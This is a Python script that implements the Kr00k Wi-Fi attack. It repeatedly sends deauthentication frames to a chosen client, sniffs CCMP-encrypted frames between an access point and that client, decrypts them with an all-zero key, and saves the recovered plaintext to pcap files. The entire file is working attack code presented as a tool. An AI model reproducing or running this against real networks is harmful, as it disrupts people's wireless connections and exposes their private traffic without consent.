import re
from time import sleep
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11CCMP, Dot11QoS
from scapy.all import sniff, sendp, scapy, wrpcap
import argparse
import threading
from Crypto.Cipher import AES


class Kr00k:
    def __init__(self, macAP, macTarget, interfaceName):
        self.macAP = macAP
        self.macTarget = macTarget
        self.interface = interfaceName
        self.nbPacket = 0
        self.kr00kPattern = b'\xaa\xaa\x03\x00\x00\x00' 


    def packet(self, sniffedPacket):
        if sniffedPacket.haslayer(Dot11CCMP):
            print("\n\033[1;32m[NEW PACKET]\033[0m")
            dot11ccmp = sniffedPacket[Dot11CCMP]
            dot11 = sniffedPacket[Dot11]

            addr = re.sub(':', '', dot11.addr2)

            tk = bytes.fromhex("00000000000000000000000000000000")
            if sniffedPacket.haslayer(Dot11QoS):
                tid = "{:01x}".format(sniffedPacket[Dot11QoS].TID)
            else:
                tid = "0"
            priority = tid + '0'

            PN = "{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}".format(dot11ccmp.PN5,dot11ccmp.PN4,dot11ccmp.PN3,dot11ccmp.PN2,dot11ccmp.PN1,dot11ccmp.PN0)

            nonce = bytes.fromhex(priority) + bytes.fromhex(addr) + bytes.fromhex(PN)
            encrypted = AES.new(tk, AES.MODE_CCM, nonce, mac_len=8)
            decrypted = encrypted.decrypt(dot11ccmp.data[:-8])
            self.nbPacket = self.nbPacket + 1
            if decrypted.startswith(self.kr00kPattern):
                hexdump(decrypted)
                final = bytes.fromhex(re.sub(":","", self.macTarget) + re.sub(":","", self.macTarget)) + decrypted[6:]
                wrpcap("enc_pckts.pcap", sniffedPacket, append=True)
                wrpcap("dec_pckts.pcap", final)
                
    def deauth(self):
        deauthPacket = RadioTap() / Dot11(type=0, subtype=12,
                                          addr1=self.macTarget,
                                          addr2=self.macAP,
                                          addr3=self.macAP)/Dot11Deauth(reason=7)
        while True:
            sendp(deauthPacket, iface=self.interface, count=1, verbose=True)
            sleep(30)


def main():
    try:
        parser = argparse.ArgumentParser(description="my take on kr00k")
        parser.add_argument("-a", "--ap", required=True,
                            help="client mac address", type=str)
        parser.add_argument("-t", "--target", required=True,
                            help="target mac address", type=str)
        parser.add_argument("-i", "--interface",
                            help="name of the interface in monitor mode",
                            type=str, default="wlan0mon")
        args = parser.parse_args()
        ap = args.ap
        target = args.target
        interface = args.interface

        krook = Kr00k(ap, target, interface)

        deauthThread = threading.Thread(target=krook.deauth)
        deauthThread.daemon = True
        deauthThread.start()

        s_filter = "ether src " + str(ap) + " and ether dst " + str(target) + " and type Data"
        sniff(iface=interface, filter=s_filter, prn=krook.packet)
        print('\n\033[1;32m' + str(krook.nbPacket) + " packets kr00ked so far"
              + '\033[0m' + "\nGoodbye !")

    except scapy.error.Scapy_Exception:
        print("Scapy Exception !")


if __name__=="__main__":
    main()
